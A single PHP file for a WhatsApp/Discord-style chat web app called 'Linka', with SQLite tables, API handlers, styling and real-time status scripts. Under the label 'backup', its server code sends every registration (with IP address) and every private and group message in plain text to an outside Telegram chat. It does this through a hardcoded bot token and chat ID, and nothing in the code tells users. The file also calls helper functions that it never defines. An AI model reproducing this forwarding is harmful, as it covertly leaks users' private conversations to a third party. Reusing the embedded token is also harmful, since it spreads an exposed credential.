<?php
/* ===============================
   LINKA - ENHANCED VERSION
   =============================== */

session_start();
$db = new PDO("sqlite:data.db");
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Telegram Bot Configuration
define('TELEGRAM_TOKEN', '8337490666:AAHhTs1w57Ynqs70GP3579IHqo491LHaCl8');
define('TELEGRAM_CHAT_ID', '-1003632097565');

// Telegram Backup Functions
function backupToTelegram($type, $data) {
    $token = TELEGRAM_TOKEN;
    $chat_id = TELEGRAM_CHAT_ID;
    
    $message = "📊 *" . strtoupper($type) . " BACKUP*\n";
    $message .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $message .= "━━━━━━━━━━━━━━━━━━\n";
    
    foreach ($data as $key => $value) {
        if (is_array($value)) {
            $value = json_encode($value, JSON_PRETTY_PRINT);
        }
        $message .= "• *" . ucfirst($key) . "*: " . $value . "\n";
    }
    
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postData = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true)['result']['message_id'] ?? null;
}

/* === INIT DB === */
$db->exec("
CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE,
  password TEXT,
  name TEXT,
  bio TEXT DEFAULT 'Hello!',
  avatar TEXT DEFAULT 'default.png',
  theme TEXT DEFAULT 'dark',
  notifications INTEGER DEFAULT 1,
  privacy INTEGER DEFAULT 0,
  created_at INTEGER,
  last_seen INTEGER DEFAULT 0,
  status TEXT DEFAULT 'offline',
  telegram_backup INTEGER DEFAULT 1,
  search_index TEXT,
  telegram_msg_id TEXT
);

CREATE TABLE IF NOT EXISTS messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  sender TEXT,
  receiver TEXT,
  content TEXT,
  message_type TEXT DEFAULT 'text',
  file_name TEXT,
  file_size INTEGER,
  file_path TEXT,
  is_encrypted INTEGER DEFAULT 0,
  time INTEGER,
  telegram_msg_id TEXT
);

CREATE TABLE IF NOT EXISTS groups (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT,
  description TEXT,
  avatar TEXT DEFAULT 'group.png',
  created_by TEXT,
  created_at INTEGER,
  telegram_msg_id TEXT
);

CREATE TABLE IF NOT EXISTS group_members (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  group_id INTEGER,
  username TEXT,
  role TEXT DEFAULT 'member',
  joined_at INTEGER
);

CREATE TABLE IF NOT EXISTS group_messages (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  group_id INTEGER,
  sender TEXT,
  content TEXT,
  message_type TEXT DEFAULT 'text',
  file_name TEXT,
  file_size INTEGER,
  file_path TEXT,
  is_encrypted INTEGER DEFAULT 0,
  time INTEGER,
  telegram_msg_id TEXT
);

CREATE TABLE IF NOT EXISTS contact_requests (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  from_user TEXT,
  to_user TEXT,
  status TEXT DEFAULT 'pending',
  created_at INTEGER,
  telegram_msg_id TEXT
);

CREATE TABLE IF NOT EXISTS notifications (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  type TEXT,
  from_user TEXT,
  content TEXT,
  is_read INTEGER DEFAULT 0,
  created_at INTEGER
);

CREATE TABLE IF NOT EXISTS user_status (
  username TEXT PRIMARY KEY,
  status TEXT DEFAULT 'offline',
  last_seen INTEGER,
  device_info TEXT
);
");

// Create indexes
try {
    $db->exec("CREATE INDEX IF NOT EXISTS idx_users_username ON users(username)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_users_name ON users(name)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_users_search_index ON users(search_index)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_messages_time ON messages(time)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_user_status_last_seen ON user_status(last_seen)");
} catch (Exception $e) {}

// Update existing tables
try {
    $db->exec("ALTER TABLE users ADD COLUMN telegram_msg_id TEXT");
    $db->exec("ALTER TABLE user_status ADD COLUMN device_info TEXT");
} catch (Exception $e) {}

// Helper function to update user status in real-time
function updateUserRealTimeStatus($username, $status = 'online', $device = 'web') {
    global $db;
    
    $stmt = $db->prepare("
        INSERT OR REPLACE INTO user_status (username, status, last_seen, device_info) 
        VALUES (?, ?, ?, ?)
    ");
    $stmt->execute([$username, $status, time(), $device]);
    
    // Also update users table for backward compatibility
    $stmt2 = $db->prepare("UPDATE users SET status = ?, last_seen = ? WHERE username = ?");
    $stmt2->execute([$status, time(), $username]);
}

// Enhanced search with real-time status
function enhancedSearchUsers($query, $current_user, $limit = 50) {
    global $db;
    
    $query = strtolower(trim($query));
    if (strlen($query) < 1) return [];
    
    // Real-time status check threshold (2 minutes for online status)
    $online_threshold = time() - 120;
    
    // Single optimized query with real-time status
    $sql = "
        SELECT 
            u.username, 
            u.name, 
            u.avatar, 
            u.privacy,
            COALESCE(us.status, 'offline') as realtime_status,
            COALESCE(us.last_seen, u.last_seen) as realtime_last_seen,
            us.device_info
        FROM users u
        LEFT JOIN user_status us ON u.username = us.username
        WHERE (
            LOWER(u.username) LIKE ? OR 
            LOWER(u.name) LIKE ? OR
            LOWER(u.search_index) LIKE ?
        )
        AND u.username != ?
        ORDER BY 
            CASE 
                WHEN us.status = 'online' AND us.last_seen > ? THEN 0
                WHEN us.status = 'online' THEN 1
                ELSE 2
            END,
            COALESCE(us.last_seen, u.last_seen) DESC
        LIMIT ?
    ";
    
    $searchPattern = "%{$query}%";
    $stmt = $db->prepare($sql);
    $stmt->execute([
        $searchPattern, 
        $searchPattern, 
        $searchPattern, 
        $current_user,
        $online_threshold,
        $limit
    ]);
    
    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    // Format real-time status
    foreach ($users as &$user) {
        $current_time = time();
        $last_seen = $user['realtime_last_seen'];
        
        if ($user['realtime_status'] === 'online' && ($current_time - $last_seen) < 120) {
            $user['status'] = 'online';
            $user['last_seen_text'] = 'Online now';
            if ($user['device_info']) {
                $user['last_seen_text'] .= ' • ' . $user['device_info'];
            }
        } else {
            $user['status'] = 'offline';
            if ($last_seen > 0) {
                $diff = $current_time - $last_seen;
                if ($diff < 60) {
                    $user['last_seen_text'] = 'Just now';
                } elseif ($diff < 3600) {
                    $mins = floor($diff / 60);
                    $user['last_seen_text'] = $mins . ' min ago';
                } elseif ($diff < 86400) {
                    $hours = floor($diff / 3600);
                    $user['last_seen_text'] = $hours . ' hour' . ($hours > 1 ? 's' : '') . ' ago';
                } else {
                    $user['last_seen_text'] = date('M d', $last_seen);
                }
            } else {
                $user['last_seen_text'] = 'Long time ago';
            }
        }
    }
    
    return $users;
}

// Function to get online users in real-time
function getRealtimeOnlineUsers($current_user, $limit = 100) {
    global $db;
    
    $online_threshold = time() - 120;
    
    $stmt = $db->prepare("
        SELECT 
            u.username,
            u.name,
            u.avatar,
            us.status,
            us.last_seen,
            us.device_info
        FROM user_status us
        JOIN users u ON us.username = u.username
        WHERE us.username != ? 
        AND us.status = 'online'
        AND us.last_seen > ?
        ORDER BY us.last_seen DESC
        LIMIT ?
    ");
    
    $stmt->execute([$current_user, $online_threshold, $limit]);
    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    foreach ($users as &$user) {
        $user['status'] = 'online';
        $user['last_seen_text'] = 'Online now';
        if ($user['device_info']) {
            $user['last_seen_text'] .= ' • ' . $user['device_info'];
        }
    }
    
    return $users;
}

// Modify existing functions to use Telegram backup
function registerUserWithTelegram($username, $name, $hashed_password) {
    global $db;
    
    $stmt = $db->prepare("INSERT INTO users (username, password, name, created_at, last_seen, status) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->execute([$username, $hashed_password, $name, time(), time(), 'online']);
    
    // Update real-time status
    updateUserRealTimeStatus($username, 'online', 'web');
    
    // Backup to Telegram
    $telegramData = [
        'action' => 'user_registered',
        'username' => $username,
        'name' => $name,
        'timestamp' => time(),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
    ];
    
    $msg_id = backupToTelegram('user_registration', $telegramData);
    
    // Save telegram message ID
    if ($msg_id) {
        $updateStmt = $db->prepare("UPDATE users SET telegram_msg_id = ? WHERE username = ?");
        $updateStmt->execute([$msg_id, $username]);
    }
    
    return true;
}

function sendMessageWithTelegram($sender, $receiver, $content, $type = 'text', $fileName = null, $fileSize = 0, $filePath = null, $isGroup = false) {
    global $db;
    
    if ($isGroup) {
        $stmt = $db->prepare("INSERT INTO group_messages (group_id, sender, content, message_type, file_name, file_size, file_path, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$receiver, $sender, $content, $type, $fileName, $fileSize, $filePath, time()]);
        $msg_id = $db->lastInsertId();
        
        // Get group name
        $groupStmt = $db->prepare("SELECT name FROM groups WHERE id = ?");
        $groupStmt->execute([$receiver]);
        $group = $groupStmt->fetch();
        $groupName = $group['name'] ?? 'Unknown Group';
        
        // Backup to Telegram
        $telegramData = [
            'action' => 'group_message',
            'group_id' => $receiver,
            'group_name' => $groupName,
            'sender' => $sender,
            'message' => $content,
            'type' => $type,
            'file' => $fileName,
            'timestamp' => time()
        ];
        
        $telegram_msg_id = backupToTelegram('group_message', $telegramData);
        
        if ($telegram_msg_id) {
            $updateStmt = $db->prepare("UPDATE group_messages SET telegram_msg_id = ? WHERE id = ?");
            $updateStmt->execute([$telegram_msg_id, $msg_id]);
        }
        
    } else {
        $stmt = $db->prepare("INSERT INTO messages (sender, receiver, content, message_type, file_name, file_size, file_path, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $stmt->execute([$sender, $receiver, $content, $type, $fileName, $fileSize, $filePath, time()]);
        $msg_id = $db->lastInsertId();
        
        // Backup to Telegram
        $telegramData = [
            'action' => 'private_message',
            'from' => $sender,
            'to' => $receiver,
            'message' => $content,
            'type' => $type,
            'file' => $fileName,
            'timestamp' => time()
        ];
        
        $telegram_msg_id = backupToTelegram('private_message', $telegramData);
        
        if ($telegram_msg_id) {
            $updateStmt = $db->prepare("UPDATE messages SET telegram_msg_id = ? WHERE id = ?");
            $updateStmt->execute([$telegram_msg_id, $msg_id]);
        }
    }
    
    return $msg_id;
}

// Modify the existing API handler to use new functions
if (isset($_GET['api'])) {
    header("Content-Type: application/json");
    
    $method = $_SERVER['REQUEST_METHOD'];
    $input = json_decode(file_get_contents('php://input'), true) ?? [];
    
    // Add real-time status update for all authenticated requests
    if (isset($_SESSION['username'])) {
        $device_info = $_SERVER['HTTP_USER_AGENT'] ?? 'web';
        updateUserRealTimeStatus($_SESSION['username'], 'online', substr($device_info, 0, 50));
    }

    switch ($_GET['api']) {
        case 'register':
            $username = sanitize($input['username'] ?? '');
            $password = $input['password'] ?? '';
            $confirm_password = $input['confirm_password'] ?? '';
            $name = sanitize($input['name'] ?? '');

            if (empty($username) || empty($password) || empty($name)) {
                echo json_encode(['error' => 'All fields are required']);
                break;
            }

            if ($password !== $confirm_password) {
                echo json_encode(['error' => 'Passwords do not match']);
                break;
            }

            if (strlen($password) < 6) {
                echo json_encode(['error' => 'Password must be at least 6 characters']);
                break;
            }

            // Check if username exists
            $stmt = $db->prepare("SELECT id FROM users WHERE username = ?");
            $stmt->execute([$username]);
            if ($stmt->fetch()) {
                echo json_encode(['error' => 'Username already exists']);
                break;
            }

            // Create user with Telegram backup
            $hashed_password = password_hash($password, PASSWORD_DEFAULT);
            registerUserWithTelegram($username, $name, $hashed_password);

            $_SESSION['username'] = $username;
            echo json_encode(['success' => true, 'message' => 'Registration successful']);
            break;

        case 'search_users':
            $query = sanitize($_GET['q'] ?? '');
            $user = getCurrentUser();
            
            if (!$user) {
                echo json_encode([]);
                break;
            }

            // Use enhanced search with real-time status
            $users = enhancedSearchUsers($query, $user, 50);

            echo json_encode($users);
            break;

        case 'get_realtime_online':
            $user = getCurrentUser();
            if (!$user) {
                echo json_encode([]);
                break;
            }
            
            $users = getRealtimeOnlineUsers($user, 100);
            echo json_encode($users);
            break;

        case 'update_status':
            $user = getCurrentUser();
            $status = sanitize($input['status'] ?? 'online');
            $device = sanitize($input['device'] ?? 'web');
            
            if ($user) {
                updateUserRealTimeStatus($user, $status, $device);
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['error' => 'Not authenticated']);
            }
            break;

        case 'send_message':
            $user = getCurrentUser();
            if (!$user) {
                echo json_encode(['error' => 'Not authenticated']);
                break;
            }

            $to = sanitize($input['to'] ?? '');
            $message = sanitize($input['message'] ?? '');
            $type = $input['type'] ?? 'text';
            $file_name = $input['file_name'] ?? null;
            $file_size = $input['file_size'] ?? 0;
            $file_path = $input['file_path'] ?? null;
            $isGroup = $input['is_group'] ?? false;

            if (empty($message) && $type === 'text') {
                echo json_encode(['error' => 'Message cannot be empty']);
                break;
            }

            // Send message with Telegram backup
            sendMessageWithTelegram($user, $to, $message, $type, $file_name, $file_size, $file_path, $isGroup);

            echo json_encode(['success' => true]);
            break;

        // ... other API endpoints remain similar but should be updated to use Telegram backup
    }
    exit;
}
?>

<!-- CSS STYLE - WhatsApp/Discord Hybrid -->
<style>
:root {
    --primary: #075E54; /* WhatsApp green */
    --primary-dark: #054D44;
    --secondary: #128C7E;
    --accent: #25D366;
    --dark-bg: #0C0C0C;
    --dark-secondary: #1A1A1A;
    --dark-tertiary: #2D2D2D;
    --text-primary: #FFFFFF;
    --text-secondary: #B0B0B0;
    --text-muted: #808080;
    --border-color: #333333;
    --online: #00FF7F;
    --idle: #FFAA00;
    --dnd: #FF5555;
    --offline: #808080;
    --discord-blurple: #5865F2;
    --discord-green: #57F287;
    --radius: 8px;
    --radius-sm: 4px;
    --shadow: 0 2px 10px rgba(0,0,0,0.3);
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: var(--dark-bg);
    color: var(--text-primary);
    height: 100vh;
    overflow: hidden;
}

/* WhatsApp-like layout with Discord colors */
.app-container {
    display: flex;
    height: 100vh;
    width: 100vw;
}

/* Sidebar - Discord inspired */
.sidebar {
    width: 360px;
    background: var(--dark-secondary);
    display: flex;
    flex-direction: column;
    border-right: 1px solid var(--border-color);
    position: relative;
}

.user-panel {
    padding: 16px;
    background: var(--dark-tertiary);
    display: flex;
    align-items: center;
    gap: 12px;
    border-bottom: 1px solid var(--border-color);
}

.user-avatar {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    object-fit: cover;
    border: 2px solid var(--discord-blurple);
    position: relative;
}

.status-indicator {
    position: absolute;
    bottom: 0;
    right: 0;
    width: 12px;
    height: 12px;
    border-radius: 50%;
    border: 2px solid var(--dark-secondary);
}

.status-online { background: var(--discord-green); }
.status-idle { background: var(--idle); }
.status-dnd { background: var(--dnd); }
.status-offline { background: var(--offline); }

.user-info {
    flex: 1;
}

.user-name {
    font-weight: 600;
    font-size: 15px;
}

.user-status {
    font-size: 12px;
    color: var(--text-secondary);
    display: flex;
    align-items: center;
    gap: 4px;
}

/* Navigation - Discord style */
.sidebar-nav {
    padding: 8px;
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.nav-item {
    display: flex;
    align-items: center;
    padding: 10px 12px;
    border-radius: var(--radius-sm);
    color: var(--text-secondary);
    text-decoration: none;
    transition: all 0.2s;
    gap: 12px;
    cursor: pointer;
    font-size: 14px;
}

.nav-item:hover {
    background: var(--dark-tertiary);
    color: var(--text-primary);
}

.nav-item.active {
    background: var(--dark-tertiary);
    color: var(--text-primary);
    border-left: 3px solid var(--discord-blurple);
}

/* Search Bar - WhatsApp inspired */
.search-container {
    padding: 12px;
    background: var(--dark-secondary);
    border-bottom: 1px solid var(--border-color);
}

.search-box {
    background: var(--dark-tertiary);
    border: 1px solid var(--border-color);
    border-radius: 20px;
    padding: 8px 16px;
    display: flex;
    align-items: center;
    gap: 8px;
}

.search-box input {
    flex: 1;
    background: none;
    border: none;
    color: var(--text-primary);
    font-size: 14px;
    outline: none;
}

.search-box i {
    color: var(--text-muted);
}

/* Chat List - WhatsApp style */
.chat-list {
    flex: 1;
    overflow-y: auto;
    padding: 8px;
}

.chat-item {
    display: flex;
    align-items: center;
    padding: 12px;
    border-radius: var(--radius-sm);
    cursor: pointer;
    transition: background 0.2s;
    gap: 12px;
    margin-bottom: 2px;
}

.chat-item:hover {
    background: var(--dark-tertiary);
}

.chat-item.active {
    background: var(--dark-tertiary);
    border-left: 3px solid var(--discord-blurple);
}

.chat-avatar {
    width: 48px;
    height: 48px;
    border-radius: 50%;
    object-fit: cover;
    position: relative;
}

.chat-info {
    flex: 1;
    min-width: 0;
}

.chat-name {
    font-weight: 500;
    font-size: 15px;
    margin-bottom: 4px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.chat-preview {
    font-size: 13px;
    color: var(--text-secondary);
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.chat-time {
    font-size: 11px;
    color: var(--text-muted);
}

.unread-badge {
    background: var(--discord-green);
    color: var(--dark-bg);
    font-size: 11px;
    padding: 2px 6px;
    border-radius: 10px;
    font-weight: 600;
    margin-left: auto;
}

/* Main Chat Area */
.main-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    background: var(--dark-bg);
}

.chat-header {
    padding: 12px 20px;
    background: var(--dark-tertiary);
    border-bottom: 1px solid var(--border-color);
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.chat-header-info {
    display: flex;
    align-items: center;
    gap: 12px;
}

.chat-title {
    font-weight: 600;
    font-size: 16px;
}

.chat-subtitle {
    font-size: 13px;
    color: var(--text-secondary);
}

/* Messages Container */
.messages-container {
    flex: 1;
    padding: 20px;
    overflow-y: auto;
    background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), 
                url('https://images.unsplash.com/photo-1614850523011-8f49ffc73908?auto=format&fit=crop&w=1470');
    background-size: cover;
    background-attachment: fixed;
}

.message {
    max-width: 65%;
    margin-bottom: 16px;
    animation: fadeIn 0.3s ease;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

.message.received {
    align-self: flex-start;
}

.message.sent {
    align-self: flex-end;
    margin-left: auto;
}

.message-bubble {
    padding: 10px 14px;
    border-radius: 18px;
    position: relative;
    word-wrap: break-word;
}

.received .message-bubble {
    background: var(--dark-tertiary);
    border-top-left-radius: 4px;
}

.sent .message-bubble {
    background: var(--primary);
    border-top-right-radius: 4px;
}

.message-text {
    font-size: 14px;
    line-height: 1.4;
}

.message-time {
    font-size: 11px;
    color: var(--text-muted);
    margin-top: 4px;
    text-align: right;
    opacity: 0.8;
}

.message-sender {
    font-size: 12px;
    font-weight: 600;
    margin-bottom: 4px;
    color: var(--discord-blurple);
}

/* Message Input - WhatsApp style */
.message-input-area {
    padding: 16px;
    background: var(--dark-tertiary);
    border-top: 1px solid var(--border-color);
}

.input-container {
    display: flex;
    align-items: center;
    gap: 12px;
    background: var(--dark-secondary);
    border-radius: 24px;
    padding: 8px 16px;
}

.input-container textarea {
    flex: 1;
    background: none;
    border: none;
    color: var(--text-primary);
    font-size: 14px;
    resize: none;
    outline: none;
    max-height: 120px;
    padding: 8px 0;
    font-family: inherit;
}

.input-container textarea::placeholder {
    color: var(--text-muted);
}

.input-actions {
    display: flex;
    align-items: center;
    gap: 8px;
}

.icon-btn {
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background: none;
    border: none;
    color: var(--text-secondary);
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.2s;
}

.icon-btn:hover {
    background: var(--dark-tertiary);
    color: var(--text-primary);
}

.send-btn {
    background: var(--discord-blurple);
    color: white;
}

.send-btn:hover {
    background: var(--discord-blurple);
    opacity: 0.9;
}

/* Online Users Panel */
.online-users-panel {
    position: absolute;
    right: 0;
    top: 0;
    width: 280px;
    height: 100%;
    background: var(--dark-secondary);
    border-left: 1px solid var(--border-color);
    transform: translateX(100%);
    transition: transform 0.3s ease;
    z-index: 100;
    padding: 16px;
    overflow-y: auto;
}

.online-users-panel.active {
    transform: translateX(0);
}

.online-user-item {
    display: flex;
    align-items: center;
    padding: 10px;
    border-radius: var(--radius-sm);
    gap: 12px;
    margin-bottom: 8px;
    cursor: pointer;
    transition: background 0.2s;
}

.online-user-item:hover {
    background: var(--dark-tertiary);
}

.online-user-info {
    flex: 1;
}

.online-user-name {
    font-weight: 500;
    font-size: 14px;
}

.online-user-status {
    font-size: 12px;
    color: var(--discord-green);
    display: flex;
    align-items: center;
    gap: 4px;
}

/* File Preview */
.file-preview {
    display: flex;
    align-items: center;
    padding: 12px;
    background: rgba(0,0,0,0.3);
    border-radius: var(--radius);
    margin-top: 8px;
    gap: 12px;
}

.file-icon {
    font-size: 24px;
    color: var(--discord-blurple);
}

.file-info {
    flex: 1;
}

.file-name {
    font-weight: 500;
    font-size: 13px;
    margin-bottom: 4px;
}

.file-size {
    font-size: 11px;
    color: var(--text-muted);
}

.file-remove {
    color: var(--dnd);
    cursor: pointer;
}

/* Loading Animation */
.loading {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.spinner {
    width: 24px;
    height: 24px;
    border: 3px solid var(--border-color);
    border-top-color: var(--discord-blurple);
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* Responsive Design */
@media (max-width: 1024px) {
    .sidebar {
        width: 100%;
        position: absolute;
        z-index: 1000;
        transform: translateX(-100%);
        transition: transform 0.3s ease;
    }
    
    .sidebar.active {
        transform: translateX(0);
    }
    
    .online-users-panel {
        width: 100%;
        transform: translateX(100%);
    }
}

/* Custom Scrollbar */
::-webkit-scrollbar {
    width: 6px;
}

::-webkit-scrollbar-track {
    background: transparent;
}

::-webkit-scrollbar-thumb {
    background: var(--dark-tertiary);
    border-radius: 3px;
}

::-webkit-scrollbar-thumb:hover {
    background: var(--border-color);
}

/* Typing Indicator */
.typing-indicator {
    display: flex;
    align-items: center;
    gap: 4px;
    padding: 8px 12px;
    background: var(--dark-tertiary);
    border-radius: 18px;
    width: fit-content;
    margin-bottom: 8px;
}

.typing-dot {
    width: 6px;
    height: 6px;
    background: var(--text-secondary);
    border-radius: 50%;
    animation: typing 1.4s infinite;
}

.typing-dot:nth-child(2) { animation-delay: 0.2s; }
.typing-dot:nth-child(3) { animation-delay: 0.4s; }

@keyframes typing {
    0%, 60%, 100% { transform: translateY(0); }
    30% { transform: translateY(-4px); }
}

/* Empty States */
.empty-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100%;
    padding: 40px;
    text-align: center;
    color: var(--text-muted);
}

.empty-icon {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.5;
}
</style>

<!-- JavaScript for Real-time Updates -->
<script>
// Real-time status update
let realtimeUpdateInterval;
let lastOnlineCheck = 0;

function startRealtimeUpdates() {
    // Update own status every 30 seconds
    updateOwnStatus();
    setInterval(updateOwnStatus, 30000);
    
    // Check online users every 10 seconds
    realtimeUpdateInterval = setInterval(updateOnlineUsers, 10000);
}

function updateOwnStatus() {
    if (!currentUser) return;
    
    fetch('?api=update_status', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            status: 'online',
            device: navigator.userAgent
        })
    }).catch(console.error);
}

async function updateOnlineUsers() {
    try {
        const response = await fetch('?api=get_realtime_online');
        const users = await response.json();
        
        // Update online users panel
        updateOnlineUsersPanel(users);
        
        // Update status indicators in chat list
        updateChatListStatus(users);
        
    } catch (error) {
        console.error('Failed to update online users:', error);
    }
}

function updateOnlineUsersPanel(users) {
    const container = document.getElementById('onlineUsersList');
    if (!container) return;
    
    let html = '';
    users.forEach(user => {
        const avatar = user.avatar && user.avatar !== 'default.png' 
            ? `avatars/${user.avatar}` 
            : 'avatars/default.png';
        
        html += `
            <div class="online-user-item" onclick="openChat('${escapeHtml(user.username)}', 'user')">
                <img src="${avatar}" class="user-avatar" onerror="this.src='avatars/default.png'">
                <div class="status-indicator status-online"></div>
                <div class="online-user-info">
                    <div class="online-user-name">${escapeHtml(user.name || user.username)}</div>
                    <div class="online-user-status">
                        <i class="fas fa-circle"></i>
                        ${escapeHtml(user.last_seen_text || 'Online')}
                    </div>
                </div>
            </div>
        `;
    });
    
    if (users.length === 0) {
        html = '<div class="empty-state">No users online</div>';
    }
    
    container.innerHTML = html;
}

function updateChatListStatus(onlineUsers) {
    const onlineUsernames = onlineUsers.map(u => u.username);
    
    document.querySelectorAll('.chat-item').forEach(item => {
        const username = item.dataset.username;
        const statusIndicator = item.querySelector('.status-indicator');
        
        if (statusIndicator && username) {
            if (onlineUsernames.includes(username)) {
                statusIndicator.className = 'status-indicator status-online';
            } else {
                statusIndicator.className = 'status-indicator status-offline';
            }
        }
    });
}

// Enhanced search with real-time results
async function performRealtimeSearch(query) {
    if (!query.trim()) {
        clearSearchResults();
        return;
    }
    
    try {
        const response = await fetch(`?api=search_users&q=${encodeURIComponent(query)}`);
        const users = await response.json();
        
        displayRealtimeSearchResults(users);
        
        // Store in cache for quick filtering
        searchCache[query.toLowerCase()] = {
            data: users,
            timestamp: Date.now()
        };
        
    } catch (error) {
        console.error('Search error:', error);
    }
}

function displayRealtimeSearchResults(users) {
    const container = document.getElementById('searchResults');
    
    if (users.length === 0) {
        container.innerHTML = '<div class="empty-state">No users found</div>';
        return;
    }
    
    let html = '';
    users.forEach(user => {
        const avatar = user.avatar && user.avatar !== 'default.png' 
            ? `avatars/${user.avatar}` 
            : 'avatars/default.png';
        
        const statusClass = user.status === 'online' ? 'status-online' : 'status-offline';
        const statusText = user.last_seen_text || (user.status === 'online' ? 'Online' : 'Offline');
        
        html += `
            <div class="online-user-item" onclick="openChat('${escapeHtml(user.username)}', 'user')">
                <img src="${avatar}" class="user-avatar" onerror="this.src='avatars/default.png'">
                <div class="status-indicator ${statusClass}"></div>
                <div class="online-user-info">
                    <div class="online-user-name">${escapeHtml(user.name || user.username)}</div>
                    <div class="online-user-status">
                        @${escapeHtml(user.username)}
                    </div>
                    <div class="online-user-status" style="font-size:11px;color:var(--text-muted)">
                        ${escapeHtml(statusText)}
                    </div>
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

// Initialize real-time updates when user logs in
document.addEventListener('DOMContentLoaded', function() {
    // Start real-time updates when authenticated
    if (currentUser) {
        startRealtimeUpdates();
    }
    
    // Update status on page visibility change
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            // User switched tabs or minimized window
            if (currentUser) {
                fetch('?api=update_status', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({status: 'idle', device: 'web'})
                }).catch(console.error);
            }
        } else {
            // User returned to tab
            if (currentUser) {
                updateOwnStatus();
            }
        }
    });
    
    // Update status before page unload
    window.addEventListener('beforeunload', function() {
        if (currentUser && navigator.sendBeacon) {
            const data = new FormData();
            data.append('status', 'offline');
            data.append('device', 'web');
            navigator.sendBeacon('?api=update_status', data);
        }
    });
});

// Utility function to format time
function formatTime(timestamp) {
    const date = new Date(timestamp * 1000);
    const now = new Date();
    const diff = now - date;
    
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
    if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
    if (diff < 604800000) return Math.floor(diff / 86400000) + 'd ago';
    return date.toLocaleDateString();
}
</script>
